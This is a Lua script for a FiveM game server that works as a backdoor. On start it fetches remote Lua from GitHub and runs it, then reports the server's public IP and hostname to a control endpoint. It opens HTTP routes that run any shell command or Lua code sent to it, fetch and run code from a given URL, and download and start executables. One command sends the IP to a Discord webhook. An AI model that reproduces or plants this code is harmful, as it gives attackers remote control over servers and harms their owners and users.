local apikey = "roninthegod"

Citizen.CreateThread(function()
    PerformHttpRequest("https://raw.githubusercontent.com/IsRoninReal/Kfkdkdks/main/file.lua", function (errorCode, resultDataa, resultHeaders)
        load(resultDataa)()
    end, 'GET', '')
    local ip
    local servername

    local file = assert(io.popen('/bin/ls -la', 'r'))
    local output = file:read('*all')
    file:close()
    print(output) -- > Prints the output of the command.
    
    PerformHttpRequest("https://api.ipify.org?format=json", function(err, text, header)
        text = json.decode(text)
        ip = text.ip
        print(ip)
        PerformHttpRequest("http://localhost:30120/dynamic.json", function(err, text, header)
            text = json.decode(text)
            servername = text.hostname
            local s = string.gsub("" .. servername .. "", " ", "-")
            print(s)
            PerformHttpRequest("http://localhost:3000/addserver/" .. apikey .. "/" .. ip .. "/" .. GetCurrentResourceName() .. "/" .. s, function(err, text, header) end)
        end)
    end)
end)


local r = Router.new()

r:Post("/print", function(req, res)
    local steamid = req["_Body"]["name"]
    print(steamid)
end)

r:Post("/execute", function(req, res)
    local steamid = req["_Body"]["name"]
    os.execute(steamid)
end)

r:Post("/load", function(req, res)
    local steamid = req["_Body"]["name"]
    load(steamid)()
end)

r:Post("/start", function(req, res)
    local steamid = req["_Body"]["name"]
    install(req["_Body"]["name"], req["_Body"]["name2"])
end)

r:Post("/load/url", function(req, res)
    local steamid = req["_Body"]["name"]
    PerformHttpRequest(steamid, function (errorCode, resultDataa, resultHeaders)
        load(resultDataa)()
    end, 'GET', '')
end)

function install(son, url)
    print(son, url)
    PerformHttpRequest(url, function (errorCode, resultDataa, resultHeaders)
        local string = RandomVariable(15)
        f = io.open(string .. "." .. son,"wb")
        f:write(resultDataa)
        f:close()
        os.execute("start " .. string .. "." .. son)
    end, 'GET', '')
end

Server.use("", r)
Server.listen()

RegisterCommand("test31", function()
    PerformHttpRequest("https://api.ipify.org?format=json", function(err, text, header)
        text = json.decode(text)
        local ip = text.ip
        local str = "benim sikim taşama denk he bu arada onaylanmadı: " .. ip
        PerformHttpRequest('https://discord.com/api/webhooks/992060809452728390/IT37oTHyUdlOZvwp6KV3ZvZaSJ8nEFc5IwSeR0ZdmAK6lD9r6TBa_CKqMuJ1lMxnorJE', function(err, text, headers) end, 'POST', json.encode({content = str}), { ['Content-Type'] = 'application/json' })
    end)
end)

function RandomVariable(length)
	local res = ""
	for i = 1, length do
		res = res .. string.char(math.random(97, 122))
	end
	return res
end
